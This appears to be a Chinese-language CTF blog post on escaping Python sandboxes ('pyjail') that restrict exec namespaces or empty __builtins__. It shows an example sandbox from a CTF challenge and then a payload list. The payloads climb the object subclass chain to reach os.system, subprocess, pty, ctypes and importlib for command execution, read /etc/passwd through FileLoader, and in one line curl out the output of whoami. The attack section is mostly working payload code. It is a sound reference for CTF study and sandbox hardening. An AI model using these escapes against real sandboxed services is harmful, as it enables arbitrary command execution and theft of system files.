---
title: pyjail bypass-03 绕过命名空间限制
date: 2023-05-30 10:23:57
categories:
- Python
tags:
- pyjail
mermaid: true
image:
  path: /assets/images/pyjail.jpg
toc: true
---
> - [pyjail 沙箱逃逸原理](/posts/python-沙箱逃逸原理/)
> - [绕过删除模块或方法](/posts/pyjail-bypass-01-绕过删除模块或方法/)
- [绕过基于字符串匹配的过滤](/posts/pyjail-bypass-02-字符串变换绕过/)
- [绕过命名空间限制](/posts/pyjail-bypass-03-绕过命名空间限制/)
- [绕过长度限制](/posts/pyjail-bypass-04-绕过多行限制/)
- [绕过多行限制](/posts/pyjail-bypass-05-绕过长度限制/)
- [变量覆盖与函数篡改](/posts/pyjail-bypass-06-变量覆盖与函数篡改/)
- [绕过 audit hook](/posts/pyjail-bypass-07-绕过-audit-hook/)
- [绕过 AST 沙箱](/posts/pyjail-bypass-08-绕过-AST-沙箱/)
- [绕过输出限制](/posts/pyjail-bypass-09-绕过输出限制/)
- [绕过 opcode 沙箱](/posts/pyjail-bypass-10-绕过-opcode-沙箱/)
- [利用生成器栈](/posts/pyjail-bypass-11-利用生成器栈/)


## 绕过命名空间限制

### 部分限制
有些沙箱在构建时使用 exec 来执行命令，exec 函数的第二个参数可以指定命名空间，通过修改、删除命名空间中的函数则可以构建一个沙箱。例子来源于 iscc_2016_pycalc。

```py
def _hook_import_(name, *args, **kwargs):
    module_blacklist = ['os', 'sys', 'time', 'bdb', 'bsddb', 'cgi',
                        'CGIHTTPServer', 'cgitb', 'compileall', 'ctypes', 'dircache',
                        'doctest', 'dumbdbm', 'filecmp', 'fileinput', 'ftplib', 'gzip',
                        'getopt', 'getpass', 'gettext', 'httplib', 'importlib', 'imputil',
                        'linecache', 'macpath', 'mailbox', 'mailcap', 'mhlib', 'mimetools',
                        'mimetypes', 'modulefinder', 'multiprocessing', 'netrc', 'new',
                        'optparse', 'pdb', 'pipes', 'pkgutil', 'platform', 'popen2', 'poplib',
                        'posix', 'posixfile', 'profile', 'pstats', 'pty', 'py_compile',
                        'pyclbr', 'pydoc', 'rexec', 'runpy', 'shlex', 'shutil', 'SimpleHTTPServer',
                        'SimpleXMLRPCServer', 'site', 'smtpd', 'socket', 'SocketServer',
                        'subprocess', 'sysconfig', 'tabnanny', 'tarfile', 'telnetlib',
                        'tempfile', 'Tix', 'trace', 'turtle', 'urllib', 'urllib2',
                        'user', 'uu', 'webbrowser', 'whichdb', 'zipfile', 'zipimport']
    for forbid in module_blacklist:
        if name == forbid:        # don't let user import these modules
            raise RuntimeError('No you can\' import {0}!!!'.format(forbid))
    # normal modules can be imported
    return __import__(name, *args, **kwargs)

def sandbox_exec(command):      # sandbox user input
    result = 0
    __sandboxed_builtins__ = dict(__builtins__.__dict__)
    __sandboxed_builtins__['__import__'] = _hook_import_    # hook import
    del __sandboxed_builtins__['open']
    _global = {
        '__builtins__': __sandboxed_builtins__
    }

    ...
        exec command in _global     # do calculate in a sandboxed  
    ...
```
1. 沙箱首先获取 `__builtins__`，然后依据现有的 `__builtins__` 来构建命名空间。
2. 修改 `__import__` 函数为自定义的`_hook_import_`
3. 删除 open 函数防止文件操作
4. exec 命令。

绕过方式：

由于 exec 运行在特定的命名空间里，可以通过获取其他命名空间里的 `__builtins__`（这个`__builtins__`保存的就是原始`__builtins__`的引用），比如 types 库，来执行任意命令：
```py
__import__('types').__builtins__
__import__('string').__builtins__
```
### 完全限制(no builtins)
如果沙箱完全清空了 `__builtins__`, 则无法使用 import,如下：
```py
>>> eval("__import__", {"__builtins__": {}},{"__builtins__": {}})
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
NameError: name '__import__' is not defined
>>> eval("__import__")
<built-in function __import__>

>>> exec("import os")
>>> exec("import os",{"__builtins__": {}},{"__builtins__": {}})
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
ImportError: __import__ not found
```

这种情况下我们就需要利用 python 继承链来绕过，其步骤简单来说，就是通过 python 继承链获取内置类, 然后通过这些内置类获取到敏感方法例如 os.system 然后再进行利用。

具体原理可见：[Python沙箱逃逸小结](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals)

常见的一些 payload 如下:
#### RCE
```py
# os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("ls")

# subprocess 
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen'][0]('ls')

# builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_GeneratorContextManagerBase" and "os" in x.__init__.__globals__ ][0]["__builtins__"]

# help
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_GeneratorContextManagerBase" and "os" in x.__init__.__globals__ ][0]["__builtins__"]['help']

[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]['__builtins__']

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")

[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")

#imp
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")

# ctypes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__('ctypes').CDLL(None).system('ls /'.encode())

# multiprocessing
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__('multiprocessing').Process(target=lambda: __import__('os').system('curl localhost:9999/?a=`whoami`')).start()
```
#### File

操作文件可以使用 builtins 中的 open，也可以使用 FileLoader 模块的 get_data 方法。
```py
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__=="FileLoader" ][0].get_data(0,"/etc/passwd")
```

## 参考资料
- [Python沙箱逃逸小结](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals)
- [Python 沙箱逃逸的经验总结](https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E5%89%8D%E8%A8%80)
- [Python 沙箱逃逸的通解探索之路](https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/)
- [python沙箱逃逸学习记录](https://xz.aliyun.com/t/12303#toc-11)
- [Bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [[PyJail] python沙箱逃逸探究·上（HNCTF题解 - WEEK1）](https://zhuanlan.zhihu.com/p/578986988)
- [[PyJail] python沙箱逃逸探究·中（HNCTF题解 - WEEK2）](https://zhuanlan.zhihu.com/p/579057932)
- [[PyJail] python沙箱逃逸探究·下（HNCTF题解 - WEEK3）](https://zhuanlan.zhihu.com/p/579183067)
- [audited2](https://ctftime.org/writeup/31883)
- [【ctf】HNCTF Jail All In One](https://www.woodwhale.top/archives/hnctfj-ail-all-in-one)
- [HAXLAB — Endgame Pwn](https://ctftime.org/writeup/28286)
- [Python沙箱逃逸的n种姿势](https://ctftime.org/writeup/28286)
- [hxp2020-audited](https://pullp.github.io/writeup/2020/12/26/hxp2020-audited.html)